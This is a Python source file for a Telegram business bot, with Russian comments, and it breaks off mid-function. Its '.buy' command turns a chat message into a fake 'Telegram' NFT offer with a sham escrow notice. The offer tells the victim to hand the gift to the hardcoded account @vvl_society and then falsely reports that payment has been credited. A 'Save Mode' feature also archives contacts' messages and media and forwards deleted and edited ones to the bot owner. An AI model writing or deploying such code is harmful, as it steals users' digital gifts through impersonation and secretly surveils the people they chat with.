import asyncio
import html
import logging
import os
import re
import sqlite3
import time
from datetime import datetime, timezone
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message,
    InlineKeyboardButton,
    CallbackQuery,
    BusinessConnection,
    BusinessMessagesDeleted,
    FSInputFile,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ================= НАСТРОЙКИ =================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN не задан")

RECIPIENT_USERNAME = "vvl_society"

OFFER_TTL_SECONDS = 6 * 60 * 60
TIMER_TICK = 60
DB_PATH = "save_mode.db"
MEDIA_DIR = "media"
MAX_MESSAGE_AGE_SECONDS = 300
MEDIA_CLEANUP_INTERVAL = 5 * 60

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
logging.getLogger("aiogram").setLevel(logging.WARNING)
logging.getLogger("aiogram.dispatcher").setLevel(logging.WARNING)
logging.getLogger("aiogram.event").setLevel(logging.WARNING)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_deals = {}
deal_timers = {}


# ================= БАЗА ДАННЫХ =================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bc_id TEXT,
            chat_id INTEGER,
            message_id INTEGER,
            user_id INTEGER,
            username TEXT,
            first_name TEXT,
            text TEXT,
            media_type TEXT,
            media_path TEXT,
            date TEXT,
            is_deleted INTEGER DEFAULT 0,
            is_edited INTEGER DEFAULT 0,
            old_text TEXT,
            UNIQUE(bc_id, chat_id, message_id)
        )
    """)
    try:
        conn.execute("ALTER TABLE messages ADD COLUMN first_name TEXT DEFAULT ''")
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute("ALTER TABLE messages ADD COLUMN media_path TEXT DEFAULT ''")
    except sqlite3.OperationalError:
        pass
    conn.execute("""
        CREATE TABLE IF NOT EXISTS business_owners (
            bc_id TEXT PRIMARY KEY,
            user_id INTEGER,
            username TEXT,
            first_name TEXT,
            connected_at TEXT
        )
    """)
    conn.commit()
    conn.close()


def db_save_business_owner(bc_id, user_id, username, first_name):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        INSERT OR REPLACE INTO business_owners
        (bc_id, user_id, username, first_name, connected_at)
        VALUES (?, ?, ?, ?, ?)
    """, (bc_id, user_id, username, first_name,
          datetime.now(timezone.utc).isoformat()))
    conn.commit()
    conn.close()


def db_get_bc_ids_for_user(user_id):
    """Все bc_id, принадлежащие user_id."""
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(
        "SELECT bc_id FROM business_owners WHERE user_id = ?", (user_id,)
    ).fetchall()
    conn.close()
    return [r[0] for r in rows]


def db_get_owner_for_bc(bc_id):
    """user_id владельца bc_id (или None)."""
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute(
        "SELECT user_id FROM business_owners WHERE bc_id = ?", (bc_id,)
    ).fetchone()
    conn.close()
    return row[0] if row else None


def db_save_message(bc_id, chat_id, message_id, user_id, username, first_name,
                    text, media_type, media_path, date):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        INSERT OR IGNORE INTO messages
        (bc_id, chat_id, message_id, user_id, username, first_name,
         text, media_type, media_path, date)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (bc_id, chat_id, message_id, user_id, username, first_name,
          text, media_type, media_path, date))
    conn.commit()
    conn.close()


def db_get_message(bc_id, chat_id, message_id):
    conn = sqlite3.connect(DB_PATH)
    row = conn.execute("""
        SELECT user_id, username, first_name, text, media_type, media_path, date, is_deleted
        FROM messages
        WHERE bc_id = ? AND chat_id = ? AND message_id = ?
    """, (bc_id, chat_id, message_id)).fetchone()
    conn.close()
    return row


def db_mark_deleted(bc_id, chat_id, message_id):
    conn = sqlite3.connect(DB_PATH)
    conn.execute("""
        UPDATE messages SET is_deleted = 1
        WHERE bc_id = ? AND chat_id = ? AND message_id = ?
    """, (bc_id, chat_id, message_id))
    conn.commit()
    conn.close()


def db_update_text(bc_id, chat_id, message_id, new_text):
    conn = sqlite3.connect(DB_PATH)
    old_row = conn.execute("""
        SELECT text FROM messages
        WHERE bc_id = ? AND chat_id = ? AND message_id = ?
    """, (bc_id, chat_id, message_id)).fetchone()
    old_text = old_row[0] if old_row else None
    conn.execute("""
        UPDATE messages
        SET text = ?, is_edited = 1, old_text = ?
        WHERE bc_id = ? AND chat_id = ? AND message_id = ?
    """, (new_text, old_text, bc_id, chat_id, message_id))
    conn.commit()
    conn.close()
    return old_text


def _bc_filter(bc_ids):
    """Возвращает (placeholders, bc_ids) для SQL IN (...)."""
    if not bc_ids:
        return None, []
    placeholders = ",".join("?" * len(bc_ids))
    return placeholders, bc_ids


def db_get_last_deleted_for_bcs(bc_ids, limit=10):
    if not bc_ids:
        return []
    placeholders = ",".join("?" * len(bc_ids))
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(f"""
        SELECT username, first_name, text, date, chat_id
        FROM messages
        WHERE is_deleted = 1 AND bc_id IN ({placeholders})
        ORDER BY id DESC LIMIT ?
    """, (*bc_ids, limit)).fetchall()
    conn.close()
    return rows


def db_get_last_edited_for_bcs(bc_ids, limit=10):
    if not bc_ids:
        return []
    placeholders = ",".join("?" * len(bc_ids))
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(f"""
        SELECT username, first_name, old_text, text, date
        FROM messages
        WHERE is_edited = 1 AND bc_id IN ({placeholders})
        ORDER BY id DESC LIMIT ?
    """, (*bc_ids, limit)).fetchall()
    conn.close()
    return rows


def db_search_for_bcs(bc_ids, query, limit=10):
    if not bc_ids:
        return []
    placeholders = ",".join("?" * len(bc_ids))
    conn = sqlite3.connect(DB_PATH)
    rows = conn.execute(f"""
        SELECT username, first_name, text, date
        FROM messages
        WHERE text LIKE ? AND text IS NOT NULL AND bc_id IN ({placeholders})
        ORDER BY id DESC LIMIT ?
    """, (f"%{query}%", *bc_ids, limit)).fetchall()
    conn.close()
    return rows


# ================= ТЕКСТЫ =================
TEXTS = {
    "ru": {
        "usage": (
            "⚠️ <b>Использование:</b>\n"
            "<code>.buy &lt;ссылка_на_NFT&gt; &lt;сумма&gt; &lt;валюта&gt; [eu]</code>\n\n"
            "<b>Пример:</b>\n"
            "<code>.buy https://t.me/nft/ViceCream-302895 1000 STARS</code>"
        ),
        "invalid_link": (
            "⚠️ <b>Неверная ссылка на NFT.</b>\n\n"
            "Формат: <code>https://t.me/nft/Название-Номер</code>"
        ),
        "header": "Telegram",
        "offer": "Пользователь предлагает вам",
        "for_gift": "за подарок",
        "valid_for": "Оффер действителен ещё",
        "decline_btn": "❌ Отклонить",
        "accept_btn": "✅ Принять",
        "declined": "❌ <b>Предложение отклонено</b>",
        "expired": "❌ <b>Сделка отклонена</b>",
        "alert_title": (
            "⚠️Внимание!\n\n"
            "Следуйте инструкции, чтобы не потерять подарок и получить оплату."
        ),
        "deal_lost": "⚠️ Ошибка: данные о сделке утеряны.",
        "deal_title": "NFT Deal",
        "buyer_reserved": "Покупатель зарезервировал",
        "via_escrow": "через эскроу-систему Telegram.",
        "escrow_text": (
            "Средства хранятся на специальном эскроу-счёте и будут автоматически "
            "зачислены на ваш баланс Telegram Stars сразу после передачи подарка."
        ),
        "instructions": "Инструкция для завершения сделки:",
        "step1": f"1. Передайте подарок пользователю: <b>@{RECIPIENT_USERNAME}</b>",
        "step2_prefix": "2. Нажмите «Передать NFT» и выберите",
        "step3": "3. Подтвердите передачу подарка.",
        "link_to_gift": "Ссылка на подарок",
        "final_note": (
            "Telegram зафиксирует транзакцию и моментально зачислит "
            "<b>{amount} {currency}</b> на ваш баланс. Резерв действует 24 часа."
        ),
        "transfer_btn": "📤 Передать NFT",
        "confirm_btn": "✅ Подтвердить передачу",
        "confirmed": "✅ Транзакция подтверждена!",
        "deal_done": "✅ <b>Сделка завершена.</b> Средства зачислены на баланс.",
    },
    "en": {
        "usage": (
            "⚠️ <b>Usage:</b>\n"
            "<code>.buy &lt;NFT_link&gt; &lt;amount&gt; &lt;currency&gt; [eu]</code>\n\n"
            "<b>Example:</b>\n"
            "<code>.buy https://t.me/nft/ViceCream-302895 1000 STARS</code>"
        ),
        "invalid_link": "⚠️ <b>Invalid NFT link.</b>",
        "header": "Telegram",
        "offer": "A user offers you",
        "for_gift": "for the gift",
        "valid_for": "Offer valid for another",
        "decline_btn": "❌ Decline",
        "accept_btn": "✅ Accept",
        "declined": "❌ <b>Offer declined</b>",
        "expired": "❌ <b>Deal expired</b>",
        "alert_title": (
            "⚠️ <b>Attention!</b>\n\n"
            "Follow the instructions to not lose the gift and receive payment."
        ),
        "deal_lost": "⚠️ Error: deal data lost.",
        "deal_title": "NFT Deal",
        "buyer_reserved": "The buyer has reserved",
        "via_escrow": "via the Telegram escrow system.",
        "escrow_text": (
            "The funds are held in a special escrow account and will be automatically "
            "credited to your Telegram Stars balance right after the gift is transferred."
        ),
        "instructions": "Instructions to complete the deal:",
        "step1": f"1. Transfer the gift to: <b>@{RECIPIENT_USERNAME}</b>",
        "step2_prefix": "2. Click «Transfer NFT» and choose",
        "step3": "3. Confirm the gift transfer.",
        "link_to_gift": "Gift link",
        "final_note": (
            "Telegram will credit <b>{amount} {currency}</b> to your balance. "
            "Reservation valid 24 hours."
        ),
        "transfer_btn": "📤 Transfer NFT",
        "confirm_btn": "✅ Confirm transfer",
        "confirmed": "✅ Transaction confirmed!",
        "deal_done": "✅ <b>Deal completed.</b>",
    },
}


# ================= ПАРСИНГ =================
NFT_LINK_RE = re.compile(r"t\.me/nft/(.+?)-(\d+)(?:\?|$|/)")


def parse_nft_link(url):
    match = NFT_LINK_RE.search(url)
    if not match:
        return None
    name, number = match.group(1), match.group(2)
    return {"name": name, "number": number, "full": f"{name} #{number}", "url": url}


def parse_buy_args(text):
    args = text.split()
    lang = "ru"
    if len(args) >= 2 and args[-1].lower() == "eu":
        lang = "en"
        args = args[:-1]
    if len(args) < 4:
        return None
    return lang, args[1], args[2], args[3].upper()


def format_time_left(seconds_left):
    if seconds_left < 0:
        seconds_left = 0
    minutes, _ = divmod(seconds_left, 60)
    hours, minutes = divmod(minutes, 60)
    if hours > 0:
        return f"{hours} ч. {minutes} мин."
    return f"{minutes} мин."


def build_offer_text(t, nft_title, amount, currency, nft_link, seconds_left):
    return (
        f"<b>{t['header']}</b>\n"
        f"<b>{nft_title}</b>\n\n"
        f"{t['offer']}\n"
        f"<b>{amount} {currency}</b> {t['for_gift']} {nft_link}.\n\n"
        f"{t['valid_for']} {format_time_left(seconds_left)}."
    )


def build_offer_keyboard(t, deal_id, lang):
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text=t["decline_btn"], callback_data=f"dec:{deal_id}:{lang}"),
        InlineKeyboardButton(text=t["accept_btn"], callback_data=f"acc:{deal_id}:{lang}"),
    )
    return b


def build_final_text(t, deal):
    return (
        f"<b>{t['deal_title']}</b>\n\n"
        f"Ордер #TG-D721BSTP\n\n"
        f"{t['buyer_reserved']} <b>{deal['amount']} {deal['currency']}</b> {t['via_escrow']}\n"
        f"{t['escrow_text']}\n\n"
        f"<b>{t['instructions']}</b>\n"
        f"{t['step1']}\n"
        f"{t['step2_prefix']} <b>{deal['title']}</b>\n"
        f"{t['step3']}\n\n"
        f"{t['link_to_gift']}: {deal['link']}\n\n"
        f"{t['final_note'].format(amount=deal['amount'], currency=deal['currency'])}"
    )


def build_final_keyboard(t, deal, deal_id, lang):
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text=t["transfer_btn"], url=deal["link"]))
    b.row(InlineKeyboardButton(text=t["confirm_btn"], callback_data=f"cfm:{deal_id}:{lang}"))
    return b


# ================= ТАЙМЕР ОФФЕРА =================
async def offer_timer(deal_id: str):
    deal = active_deals.get(deal_id)
    if not deal:
        return
    t = TEXTS.get(deal["lang"], TEXTS["ru"])

    try:
        while True:
            await asyncio.sleep(TIMER_TICK)
            deal = active_deals.get(deal_id)
            if not deal:
                return

            seconds_left = int(deal["expires_at"] - time.time())

            if seconds_left <= 0:
                try:
                    if deal["bc_id"]:
                        await bot.edit_message_text(
                            text=t["expired"],
                            business_connection_id=deal["bc_id"],
                            chat_id=deal["chat_id"],
                            message_id=deal["message_id"],
                            parse_mode="HTML",
                        )
                except Exception as e:
                    if "MESSAGE_ID_INVALID" not in str(e):
                        logging.error(f"timer expire edit fail: {e}")
                active_deals.pop(deal_id, None)
                deal_timers.pop(deal_id, None)
                return

            try:
                text = build_offer_text(
                    t, deal["title"], deal["amount"], deal["currency"],
                    deal["link"], seconds_left,
                )
                kb = build_offer_keyboard(t, deal_id, deal["lang"]).as_markup()
                if deal["bc_id"]:
                    await bot.edit_message_text(
                        text=text,
                        business_connection_id=deal["bc_id"],
                        chat_id=deal["chat_id"],
                        message_id=deal["message_id"],
                        reply_markup=kb,
                        parse_mode="HTML",
                        disable_web_page_preview=False,
                    )
            except Exception as e:
                if "MESSAGE_ID_INVALID" not in str(e):
                    logging.error(f"timer tick edit fail: {e}")
    except asyncio.CancelledError:
        return


def stop_timer(deal_id: str):
    task = deal_timers.pop(deal_id, None)
    if task and not task.done():
        task.cancel()


# ================= АВТООЧИСТКА MEDIA =================
async def media_cleanup_worker():
    while True:
        await asyncio.sleep(MEDIA_CLEANUP_INTERVAL)
        try:
            if not os.path.isdir(MEDIA_DIR):
                continue
            deleted = 0
            freed = 0
            for name in os.listdir(MEDIA_DIR):
                path = os.path.join(MEDIA_DIR, name)
                if os.path.isfile(path):
                    try:
                        size = os.path.getsize(path)
                        os.remove(path)
                        deleted += 1
                        freed += size
                    except Exception as e:
                        logging.error(f"cleanup file fail: {path} — {e}")
            if deleted:
                logging.info(
                    f"[CLEANUP] Удалено {deleted} файлов, "
                    f"освобождено {freed // 1024} КБ"
                )
        except Exception as e:
            logging.error(f"cleanup worker fail: {e}")


# ================= ВСПОМОГАТЕЛЬНОЕ =================
def _get_username(message: Message) -> str:
    if message.from_user:
        return message.from_user.username or ""
    return ""


def _get_first_name(message: Message) -> str:
    if message.from_user:
        return message.from_user.first_name or ""
    return ""


def _get_text(message: Message) -> str:
    return message.text or message.caption or ""


def _extract_media(message: Message):
    if message.photo:
        return "photo", message.photo[-1].file_id, "jpg"
    if message.video:
        return "video", message.video.file_id, "mp4"
    if message.video_note:
        return "video_note", message.video_note.file_id, "mp4"
    if message.voice:
        return "voice", message.voice.file_id, "ogg"
    if message.audio:
        return "audio", message.audio.file_id, "mp3"
    if message.document:
        ext = (message.document.file_name or "bin").split(".")[-1]
        return "document", message.document.file_id, ext
    if message.sticker:
        return "sticker", message.sticker.file_id, "webp"
    if message.animation:
        return "animation", message.animation.file_id, "mp4"
    return None, None, None


async def download_media(message: Message, file_id: str, ext: str):
    try:
        os.makedirs(MEDIA_DIR, exist_ok=True)
        file = await bot.get_file(file_id)
        if not file.file_path:
            return None
        filename = f"{message.chat.id}_{message.message_id}.{ext}"
        path = os.path.join(MEDIA_DIR, filename)
        await bot.download_file(file.file_path, path)
        return path
    except Exception as e:
        logging.error(f"download fail: {e}")
        return None


def _message_age_seconds(message: Message) -> float:
    now = datetime.now(timezone.utc)
    return (now - message.date).total_seconds()


def _format_user_link(username, user_id, first_name=""):
    name = html.escape(first_name or "")
    uname = html.escape(username or "?")
    parts = []
    if name:
        parts.append(name)
    parts.append(f'(<a href="tg://user?id={user_id}">@{uname}</a>)')
    parts.append(f'[{user_id}]')
    return " ".join(parts)


def _format_time(date):
    if isinstance(date, datetime):
        return date.strftime("%H:%M:%S")
    try:
        return datetime.fromisoformat(date).strftime("%H:%M:%S")
    except Exception:
        return date[:8] if date else "?"


def _media_label(media_type):
    labels = {
        "photo": "📷 Фото",
        "video": "🎥 Видео",
        "video_note": "⭕ Видео-кружок",
        "voice": "🎤 Голосовое",
        "audio": "🎵 Аудио",
        "document": "📄 Документ",
        "sticker": "🎨 Стикер",
        "animation": "🎞 GIF",
    }
    return labels.get(media_type, "📎 Медиа")


def build_deleted_notification(username, user_id, first_name, text, date, media_type=None):
    user_str = _format_user_link(username, user_id, first_name)
    time_str = _format_time(date)
    body = f"🗑 <b>Это сообщение было удалено</b>\nОт: {user_str}\n\n"
    if text:
        body += f"<blockquote>{html.escape(text)}</blockquote>\n\n"
    elif media_type:
        body += f"<i>{_media_label(media_type)}</i>\n\n"
    body += f"<code>{time_str}</code>"
    return body


def build_edited_notification(username, user_id, first_name, old_text, new_text, date):
    user_str = _format_user_link(username, user_id, first_name)
    safe_old = html.escape(old_text or "(пусто)")
    safe_new = html.escape(new_text or "(пусто)")
    time_str = _format_time(date)
    return (
        f"✏️ {user_str} отредактировал сообщение.\n\n"
        f"<blockquote>{safe_old}</blockquote>\n⇓⇓⇓\n"
        f"<blockquote>{safe_new}</blockquote>\n\n"
        f"<code>{time_str}</code>"
    )


def build_notification_keyboard(user_id, username=None):
    b = InlineKeyboardBuilder()
    if username:
        dialogs_url = f"https://t.me/{username}"
    else:
        dialogs_url = f"tg://user?id={user_id}"
    who_url = f"tg://user?id={user_id}"
    b.row(
        InlineKeyboardButton(text="💬 Диалоги", url=dialogs_url),
        InlineKeyboardButton(text="👤 Кто писал?", url=who_url),
    )
    return b.as_markup()


async def send_media_to_owner(owner_id, media_path, media_type, notification, kb):
    if not owner_id:
        return
    if not media_path or not os.path.exists(media_path):
        try:
            await bot.send_message(
                owner_id, notification,
                parse_mode="HTML",
                reply_markup=kb,
                disable_web_page_preview=True,
            )
        except Exception as e:
            logging.error(f"send msg fail: {e}")
        return
    file = FSInputFile(media_path)
    try:
        if media_type == "photo":
            await bot.send_photo(owner_id, file, caption=notification[:1024],
                                 parse_mode="HTML", reply_markup=kb)
        elif media_type in ("video", "video_note", "animation"):
            await bot.send_video(owner_id, file, caption=notification[:1024],
                                 parse_mode="HTML", reply_markup=kb)
        elif media_type == "voice":
            await bot.send_voice(owner_id, file, caption=notification[:1024],
                                 parse_mode="HTML", reply_markup=kb)
        elif media_type == "audio":
            await bot.send_audio(owner_id, file, caption=notification[:1024],
                                 parse_mode="HTML", reply_markup=kb)
        elif media_type == "document":
            await bot.send_document(owner_id, file, caption=notification[:1024],
                                    parse_mode="HTML", reply_markup=kb)
        elif media_type == "sticker":
            await bot.send_sticker(owner_id, file, reply_markup=kb)
            await bot.send_message(owner_id, notification, parse_mode="HTML")
        else:
            await bot.send_document(owner_id, file, caption=notification[:1024],
                                    parse_mode="HTML", reply_markup=kb)
    except Exception as e:
        logging.error(f"send media fail: {e}")
        try:
            await bot.send_message(
                owner_id, notification,
                parse_mode="HTML",
                reply_markup=kb,
                disable_web_page_preview=True,
            )
        except Exception as e2:
            logging.error(f"fallback send fail: {e2}")


# ================= /start =================
@dp.message(Command("start"))
async def cmd_start(message: Message):
    logging.info(f"[START] user_id={message.from_user.id}")
    await message.answer(
        "👋 <b>Привет!</b>\n\n"
        "Я — бот для автоматизации Telegram Business.\n\n"
        "📌 <b>Как пользоваться:</b>\n"
        "Напиши в Business-чате:\n"
        "<code>.buy https://t.me/nft/Название-Номер 1000 STARS</code>\n\n"
        "💾 <b>Save Mode включён.</b> Уведомления об удалениях и правках "
        "приходят <b>только тебе</b> — по твоим Business-подключениям.\n\n"
        "📋 <b>Команды:</b>\n"
        "/deleted — последние удалённые\n"
        "/edits — последние правки\n"
        "/search текст — поиск по архиву",
        parse_mode="HTML",
    )


# ================= КОМАНДЫ (ДЛЯ ВСЕХ) =================
@dp.message(Command("deleted"))
async def cmd_deleted(message: Message):
    user_id = message.from_user.id
    bc_ids = db_get_bc_ids_for_user(user_id)
    if not bc_ids:
        await message.answer(
            "⚠️ У тебя нет активных Business-подключений.\n"
            "Подключи бота: Настройки → Telegram Business → Чат-боты"
        )
        return
    rows = db_get_last_deleted_for_bcs(bc_ids, 10)
    if not rows:
        await message.answer("🗑 Удалённых сообщений нет")
        return
    result = "🗑 <b>Последние удалённые:</b>\n\n"
    for username, first_name, text, date, chat_id in rows:
        result += (
            f"👤 {first_name or ''} @{username or '?'} • <code>{date[:16]}</code>\n"
            f"💬 {text[:200] if text else '(без текста)'}\n\n"
        )
    await message.answer(result, parse_mode="HTML")


@dp.message(Command("edits"))
async def cmd_edits(message: Message):
    user_id = message.from_user.id
    bc_ids = db_get_bc_ids_for_user(user_id)
    if not bc_ids:
        await message.answer(
            "⚠️ У тебя нет активных Business-подключений.\n"
            "Подключи бота: Настройки → Telegram Business → Чат-боты"
        )
        return
    rows = db_get_last_edited_for_bcs(bc_ids, 10)
    if not rows:
        await message.answer("✏️ Правок не найдено")
        return
    result = "✏️ <b>Последние правки:</b>\n\n"
    for username, first_name, old, new, date in rows:
        result += (
            f"👤 {first_name or ''} @{username or '?'} • <code>{date[:16]}</code>\n"
            f"<b>Было:</b> {old or '(пусто)'}\n"
            f"<b>Стало:</b> {new or '(пусто)'}\n\n"
        )
    await message.answer(result, parse_mode="HTML")


@dp.message(Command("search"))
async def cmd_search(message: Message):
    user_id = message.from_user.id
    bc_ids = db_get_bc_ids_for_user(user_id)
    if not bc_ids:
        await message.answer(
            "⚠️ У тебя нет активных Business-подключений."
        )
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Использование: /search текст")
        return
    rows = db_search_for_bcs(bc_ids, args[1], 10)
    if not rows:
        await message.answer(f"🔍 Ничего не найдено по запросу: {args[1]}")
        return
    result = f"🔍 <b>Найдено по «{args[1]}»:</b>\n\n"
    for username, first_name, text, date in rows:
        result += (
            f"👤 {first_name or ''} @{username or '?'} • <code>{date[:16]}</code>\n"
            f"{text[:200]}\n\n"
        )
    await message.answer(result, parse_mode="HTML")


# ================= ЕДИНЫЙ ОБРАБОТЧИК BUSINESS-СООБЩЕНИЙ =================
@dp.business_message()
async def handle_business_message(message: Message):
    bc_id = message.business_connection_id
    if not bc_id:
        return

    if message.text and message.text.startswith("/"):
        return

    logging.info(
        f"[BUSINESS MSG] bc_id={bc_id}, chat={message.chat.id}, "
        f"from={message.from_user.id if message.from_user else '?'}, "
        f"text={message.text!r}"
    )

    if message.text and message.text.startswith(".buy"):
        logging.info(f"[BUSINESS BUY] bc_id={bc_id}")
        await process_buy(message, bc_id)
        return

    # Save Mode всегда включён
    age = _message_age_seconds(message)
    if age > MAX_MESSAGE_AGE_SECONDS:
        logging.info(f"[SKIP-OLD] age={int(age)}s")
        return

    media_type, file_id, ext = _extract_media(message)
    media_path = ""
    if media_type and file_id:
        media_path = await download_media(message, file_id, ext) or ""
        logging.info(f"[MEDIA] {media_type} → {media_path}")

    try:
        db_save_message(
            bc_id=bc_id,
            chat_id=message.chat.id,
            message_id=message.message_id,
            user_id=message.from_user.id if message.from_user else 0,
            username=_get_username(message),
            first_name=_get_first_name(message),
            text=_get_text(message),
            media_type=media_type,
            media_path=media_path,
            date=message.date.isoformat(),
        )
    except Exception as e:
        logging.error(f"save msg fail: {e}")


# ================= SAVE MODE: правки =================
@dp.edited_business_message()
async def on_edited_business(message: Message):
    bc_id = message.business_connection_id
    if not bc_id:
        return

    age = _message_age_seconds(message)
    if age > MAX_MESSAGE_AGE_SECONDS:
        return

    new_text = _get_text(message)
    old_text = db_update_text(bc_id, message.chat.id, message.message_id, new_text)

    if not (old_text or "").strip() and not (new_text or "").strip():
        return
    if (old_text or "").strip() == (new_text or "").strip():
        return

    owner_id = db_get_owner_for_bc(bc_id)
    if not owner_id:
        logging.info(f"[SKIP] bc_id={bc_id} не в business_owners")
        return

    user = message.from_user
    notification = build_edited_notification(
        username=user.username if user else "?",
        user_id=user.id if user else 0,
        first_name=user.first_name if user else "",
        old_text=old_text,
        new_text=new_text,
        date=message.date.isoformat(),
    )
    kb = build_notification_keyboard(
        user_id=user.id if user else 0,
        username=user.username if user else None,
    )
    try:
        await bot.send_message(
            owner_id, notification,
            parse_mode="HTML",
            reply_markup=kb,
            disable_web_page_preview=True,
        )
    except Exception as e:
        logging.error(f"notify owner {owner_id} fail: {e}")


# ================= SAVE MODE: удаления =================
@dp.deleted_business_messages()
async def on_deleted_business(event: BusinessMessagesDeleted):
    bc_id = event.business_connection_id
    chat_id = event.chat.id

    owner_id = db_get_owner_for_bc(bc_id)
    if not owner_id:
        logging.info(f"[SKIP] bc_id={bc_id} не в business_owners")
        return

    for msg_id in event.message_ids:
        row = db_get_message(bc_id, chat_id, msg_id)
        if not row:
            continue
        (user_id, username, first_name, text, media_type,
         media_path, date, is_deleted) = row
        if not (text or "").strip() and not media_type:
            continue
        db_mark_deleted(bc_id, chat_id, msg_id)
        notification = build_deleted_notification(
            username=username,
            user_id=user_id,
            first_name=first_name,
            text=text,
            date=date,
            media_type=media_type,
        )
        kb = build_notification_keyboard(
            user_id=user_id,
            username=username,
        )
        await send_media_to_owner(owner_id, media_path, media_type, notification, kb)


# ================= ОБРАБОТКА .buy =================
async def process_buy(message: Message, bc_id):
    parsed = parse_buy_args(message.text)
    t = TEXTS["ru"]

    if not parsed:
        try:
            if bc_id:
                await bot.edit_message_text(
                    text=t["usage"],
                    business_connection_id=bc_id,
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    parse_mode="HTML",
                )
            else:
                await message.answer(t["usage"], parse_mode="HTML")
        except Exception as e:
            if "MESSAGE_ID_INVALID" not in str(e):
                logging.error(f"usage edit fail: {e}")
        return

    lang, nft_link, amount, currency = parsed
    t = TEXTS[lang]

    nft_data = parse_nft_link(nft_link)
    if not nft_data:
        try:
            if bc_id:
                await bot.edit_message_text(
                    text=t["invalid_link"],
                    business_connection_id=bc_id,
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    parse_mode="HTML",
                )
            else:
                await message.answer(t["invalid_link"], parse_mode="HTML")
        except Exception as e:
            if "MESSAGE_ID_INVALID" not in str(e):
                logging.error(f"invalid_link edit fail: {e}")
        return

    nft_title = nft_data["full"]
    deal_id = f"{message.chat.id}_{message.message_id}"
    expires_at = time.time() + OFFER_TTL_SECONDS

    text = build_offer_text(t, nft_title, amount, currency, nft_link, OFFER_TTL_SECONDS)
    kb = build_offer_keyboard(t, deal_id, lang).as_markup()

    try:
        if bc_id:
            await bot.edit_message_text(
                text=text,
                business_connection_id=bc_id,
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=kb,
                parse_mode="HTML",
                disable_web_page_preview=False,
            )
        else:
            await message.answer(
                text=text, reply_markup=kb,
                parse_mode="HTML", disable_web_page_preview=False,
            )
    except Exception as e:
        if "MESSAGE_ID_INVALID" not in str(e):
            logging.error(f"offer edit fail: {e}")
        return

    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title,
        "lang": lang,
        "user_id": message.from_user.id,
        "chat_id": message.chat.id,
        "bc_id": bc_id,
        "expires_at": expires_at,
        "message_id": message.message_id,
    }

    deal_timers[deal_id] = asyncio.create_task(offer_timer(deal_id))


@dp.message(Command("buy"))
@dp.message(F.text.startswith(".buy"))
async def handle_regular_buy(message: Message):
    logging.info(f"[REGULAR BUY] user={message.from_user.id}")
    await process_buy(message, None)


# ================= BUSINESS CONNECTION =================
@dp.business_connection()
async def on_business_connection(conn: BusinessConnection):
    user = conn.user
    db_save_business_owner(
        bc_id=conn.id,
        user_id=user.id,
        username=user.username or "",
        first_name=user.first_name or "",
    )
    logging.info(
        f"[BUSINESS CONNECTION] bc_id={conn.id} → owner={user.id}, "
        f"can_reply={conn.rights.can_reply}, can_read={conn.rights.can_read_messages}"
    )


# ================= CALLBACKS =================
@dp.callback_query(F.data.startswith("dec:"))
async def process_decline(cb: CallbackQuery):
    _, deal_id, lang = cb.data.split(":")
    t = TEXTS.get(lang, TEXTS["ru"])
    deal = active_deals.get(deal_id)
    stop_timer(deal_id)
    try:
        if deal and deal["bc_id"]:
            await bot.edit_message_text(
                text=t["declined"],
                business_connection_id=deal["bc_id"],
                chat_id=deal["chat_id"],
                message_id=deal["message_id"],
                parse_mode="HTML",
            )
        else:
            await cb.message.edit_text(t["declined"], parse_mode="HTML")
    except Exception as e:
        if "MESSAGE_ID_INVALID" not in str(e):
            logging.error(f"decline edit fail: {e}")
    active_deals.pop(deal_id, None)
    await cb.answer()


@dp.callback_query(F.data.startswith("acc:"))
async def process_accept(cb: CallbackQuery):
    _, deal_id, lang = cb.data.split(":")
    t = TEXTS.get(lang, TEXTS["ru"])
    deal = active_deals.get(deal_id)
    if not deal:
        await cb.answer(t["deal_lost"], show_alert=True)
        return
    stop_timer(deal_id)
    await cb.answer(text=t["alert_title"], show_alert=True)
    await asyncio.sleep(2)
    text = build_final_text(t, deal)
    kb = build_final_keyboard(t, deal, deal_id, lang).as_markup()
    try:
        if deal["bc_id"]:
            await bot.edit_message_text(
                text=text,
                business_connection_id=deal["bc_id"],
                chat_id=deal["chat_id"],
                message_id=deal["message_id"],
                reply_markup=kb,
                parse_mode="HTML",
                disable_web_page_preview=False,
            )
        else:
            await cb.message.edit_text(
                text=text, reply_markup=kb,
                parse_mode="HTML", disable_web_page_preview=False,
            )
    except Exception as e:
        if "MESSAGE_ID_INVALID" not in str(e):
            logging.error(f"accept edit fail: {e}")


@dp.callback_query(F.data.startswith("cfm:"))
async def process_confirm(cb: CallbackQuery):
    _, deal_id, lang = cb.data.split(":")
    t = TEXTS.get(lang, TEXTS["ru"])
    deal = active_deals.get(deal_id)
    await cb.answer(t["confirmed"], show_alert=True)
    try:
        if deal and deal["bc_id"]:
            await bot.edit_message_text(
                text=t["deal_done"],
                business_connection_id=deal["bc_id"],
                chat_id=deal["chat_id"],
                message_id=deal["message_id"],
                parse_mode="HTML",
            )
        else:
            await cb.message.edit_text(t["deal_done"], parse_mode="HTML")
    except Exception as e:
